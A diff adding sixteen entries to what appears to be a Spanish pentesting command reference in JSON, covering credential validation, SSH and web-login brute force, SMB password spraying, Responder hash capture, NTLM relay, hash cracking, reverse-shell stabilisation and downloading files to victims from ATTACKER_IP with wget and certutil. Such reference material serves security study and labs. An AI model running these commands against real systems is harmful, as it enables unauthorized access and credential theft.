@@ -7,7 +7,7 @@
     "totalGuides": 10,
     "totalConcepts": 74,
     "totalPaths": 14,
-    "totalCommandMetadata": 131
+    "totalCommandMetadata": 147
   },
   "tags": [
     "active-directory",
@@ -11012,6 +11012,389 @@
         "Historial vaciado o enlazado a /dev/null"
       ],
       "alternative": "~/.zsh_history / ~/.mysql_history",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "credenciales-y-acceso",
+      "command": "nxc smb $IP -u $USER -p $PASS",
+      "objective": "Validar una credencial por SMB",
+      "tool": "netexec",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": true,
+      "credentialType": "password",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Si la credencial vale en ese host (marca Pwn3d! si es admin).",
+      "successSignal": "Autentica y confirma acceso (o admin local).",
+      "commonErrors": [
+        "Credencial invalida o SMB filtrado"
+      ],
+      "alternative": "nxc winrm/ldap",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "credenciales-y-acceso",
+      "command": "mysql -h $IP -u $USER -p",
+      "objective": "Conectarse a un MySQL remoto",
+      "tool": "mysql",
+      "environment": "kali",
+      "targetOS": "network",
+      "credentialsRequired": true,
+      "credentialType": "password",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Un prompt mysql> si las credenciales valen.",
+      "successSignal": "Entras y puedes enumerar bases y usuarios.",
+      "commonErrors": [
+        "Acceso denegado",
+        "3306 no accesible desde fuera"
+      ],
+      "alternative": "mysql -e 'show databases;'",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "credenciales-y-acceso",
+      "command": "sudo -l",
+      "objective": "Ver que puedes ejecutar como root con sudo",
+      "tool": "sudo",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": true,
+      "credentialType": "password",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Los comandos permitidos via sudo para tu usuario.",
+      "successSignal": "Un binario con (ALL) o NOPASSWD explotable (GTFOBins).",
+      "commonErrors": [
+        "El usuario no tiene entradas sudo",
+        "Pide contrasena que no tienes"
+      ],
+      "alternative": "GTFOBins del binario permitido",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "credenciales-y-acceso",
+      "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP ssh",
+      "objective": "Fuerza bruta de contrasena por SSH",
+      "tool": "hydra",
+      "environment": "kali",
+      "targetOS": "network",
+      "credentialsRequired": false,
+      "credentialType": "password",
+      "privileges": "user",
+      "noise": "high",
+      "risk": "intrusive",
+      "preconditions": [
+        "Un usuario valido conocido"
+      ],
+      "expectedOutput": "La contrasena si esta en el diccionario.",
+      "successSignal": "hydra marca [ssh] host login: ... password: ...",
+      "commonErrors": [
+        "Bloqueo por intentos (fail2ban)",
+        "Usuario incorrecto"
+      ],
+      "alternative": "medusa -M ssh",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "credenciales-y-acceso",
+      "command": "hydra -l admin -P rockyou.txt $IP http-post-form \"/login:user=^USER^&pass=^PASS^:F=Invalid\"",
+      "objective": "Fuerza bruta de un login web (POST)",
+      "tool": "hydra",
+      "environment": "kali",
+      "targetOS": "web",
+      "credentialsRequired": false,
+      "credentialType": "password",
+      "privileges": "user",
+      "noise": "high",
+      "risk": "intrusive",
+      "preconditions": [
+        "Saber los campos del form y el texto de fallo"
+      ],
+      "expectedOutput": "La contrasena valida del formulario.",
+      "successSignal": "hydra encuentra el par que no devuelve 'Invalid'.",
+      "commonErrors": [
+        "Cadena F= mal elegida (falsos positivos)",
+        "CSRF token requerido"
+      ],
+      "alternative": "ffuf -w con matcher",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "credenciales-y-acceso",
+      "command": "nxc smb $IP -u users.txt -p rockyou.txt --continue-on-success",
+      "objective": "Password spraying por SMB",
+      "tool": "netexec",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "password",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "intrusive",
+      "preconditions": [
+        "Lista de usuarios validos"
+      ],
+      "expectedOutput": "Que combinacion usuario/clave autentica.",
+      "successSignal": "Aparece un [+] con una credencial valida.",
+      "commonErrors": [
+        "Lockout policy: pocas pruebas por cuenta",
+        "Ninguna combinacion vale"
+      ],
+      "alternative": "kerbrute passwordspray",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "credenciales-y-acceso",
+      "command": "sudo responder -I tun0 -wv",
+      "objective": "Capturar hashes NetNTLM en la red",
+      "tool": "responder",
+      "environment": "attacker",
+      "targetOS": "network",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "intrusive",
+      "preconditions": [
+        "Estar en el mismo segmento (LLMNR/NBT-NS activo)"
+      ],
+      "expectedOutput": "Hashes NetNTLMv2 de quien resuelva nombres.",
+      "successSignal": "Cae un NetNTLMv2 para crackear (-m 5600) o relay.",
+      "commonErrors": [
+        "Sin trafico de resolucion",
+        "SMB signing obliga: no sirve para relay"
+      ],
+      "alternative": "ntlmrelayx",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "credenciales-y-acceso",
+      "command": "impacket-ntlmrelayx -tf targets.txt -smb2support",
+      "objective": "Reenviar autenticacion NTLM a otros hosts",
+      "tool": "impacket",
+      "environment": "attacker",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "hash",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "intrusive",
+      "preconditions": [
+        "Objetivos con SMB signing desactivado"
+      ],
+      "expectedOutput": "Ejecucion o volcado de SAM en el host destino.",
+      "successSignal": "ntlmrelayx autentica en el target y vuelca hashes.",
+      "commonErrors": [
+        "SMB signing obligatorio (relay bloqueado)"
+      ],
+      "alternative": "responder (solo captura)",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "credenciales-y-acceso",
+      "command": "hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt",
+      "objective": "Crackear un hash NetNTLMv2",
+      "tool": "hashcat",
+      "environment": "attacker",
+      "targetOS": "any",
+      "credentialsRequired": false,
+      "credentialType": "hash",
+      "privileges": "user",
+      "noise": "silent",
+      "risk": "safe",
+      "preconditions": [
+        "Un hash capturado con responder"
+      ],
+      "expectedOutput": "La contrasena del usuario capturado.",
+      "successSignal": "hashcat marca Cracked con la clave.",
+      "commonErrors": [
+        "La clave no esta en el diccionario"
+      ],
+      "alternative": "john --format=netntlmv2",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "credenciales-y-acceso",
+      "command": "smbclient -L //$IP -U 'user%password'",
+      "objective": "Listar shares SMB autenticado",
+      "tool": "smbclient",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": true,
+      "credentialType": "password",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Los recursos compartidos visibles para esa cuenta.",
+      "successSignal": "Aparecen shares no estandar que puedes explorar.",
+      "commonErrors": [
+        "Credencial invalida",
+        "Acceso denegado al listado"
+      ],
+      "alternative": "nxc smb --shares",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "credenciales-y-acceso",
+      "command": "nxc winrm $IP -u user -p password",
+      "objective": "Comprobar acceso por WinRM",
+      "tool": "netexec",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": true,
+      "credentialType": "password",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Si el usuario puede entrar por WinRM (Pwn3d! = shell).",
+      "successSignal": "Marca Pwn3d!: usa evil-winrm para shell.",
+      "commonErrors": [
+        "5985 cerrado o usuario sin Remote Management"
+      ],
+      "alternative": "evil-winrm",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "acceso-inicial",
+      "command": "stty raw -echo; fg",
+      "objective": "Estabilizar una reverse shell (TTY completa)",
+      "tool": "stty",
+      "environment": "attacker",
+      "targetOS": "any",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "silent",
+      "risk": "safe",
+      "preconditions": [
+        "Ya hiciste python3 -c pty.spawn y Ctrl+Z"
+      ],
+      "expectedOutput": "Una shell con TTY: flechas, Ctrl+C y tab funcionan.",
+      "successSignal": "Puedes usar la shell como una terminal normal.",
+      "commonErrors": [
+        "Olvidar export TERM=xterm (menos/vim rotos)"
+      ],
+      "alternative": "socat / script /dev/null",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "acceso-inicial",
+      "command": "socat file:`tty`,raw,echo=0 tcp-listen:4444",
+      "objective": "Listener socat para shell totalmente interactiva",
+      "tool": "socat",
+      "environment": "attacker",
+      "targetOS": "any",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [
+        "socat en atacante y victima"
+      ],
+      "expectedOutput": "Una shell TTY completa cuando la victima conecte.",
+      "successSignal": "Shell estable sin trucos de stty.",
+      "commonErrors": [
+        "socat no esta en la victima"
+      ],
+      "alternative": "stty raw -echo",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "acceso-inicial",
+      "command": "socat tcp-listen:8001,fork tcp:INTERNAL_IP:80",
+      "objective": "Redirigir un puerto hacia un host interno",
+      "tool": "socat",
+      "environment": "target",
+      "targetOS": "network",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [
+        "Estar en un host con ruta a la red interna"
+      ],
+      "expectedOutput": "El puerto local 8001 sale al servicio interno.",
+      "successSignal": "Alcanzas un servicio interno desde tu maquina.",
+      "commonErrors": [
+        "Sin ruta al INTERNAL_IP"
+      ],
+      "alternative": "chisel / ssh -L",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "acceso-inicial",
+      "command": "wget http://ATTACKER_IP:8000/file -O /tmp/file",
+      "objective": "Bajar un fichero a la victima Linux",
+      "tool": "wget",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "caution",
+      "preconditions": [
+        "Servidor HTTP tuyo sirviendo el fichero"
+      ],
+      "expectedOutput": "El fichero cae en /tmp de la victima.",
+      "successSignal": "Transferencia completa y ejecutable tras chmod +x.",
+      "commonErrors": [
+        "Sin salida a tu IP",
+        "wget no instalado (usa curl)"
+      ],
+      "alternative": "curl -o / scp",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "acceso-inicial",
+      "command": "certutil -urlcache -split -f http://ATTACKER_IP:8000/file.exe C:\\Windows\\Temp\\file.exe",
+      "objective": "Bajar un fichero a la victima Windows",
+      "tool": "certutil",
+      "environment": "target",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "caution",
+      "preconditions": [
+        "Tu servidor HTTP sirviendo el .exe"
+      ],
+      "expectedOutput": "El binario cae en C:\\Windows\\Temp.",
+      "successSignal": "Descarga completa lista para ejecutar.",
+      "commonErrors": [
+        "AV borra el fichero",
+        "Sin salida a tu IP"
+      ],
+      "alternative": "powershell iwr / SMB",
       "checkedVersion": "2025.1",
       "reviewedAt": "2026-07-11"
     }
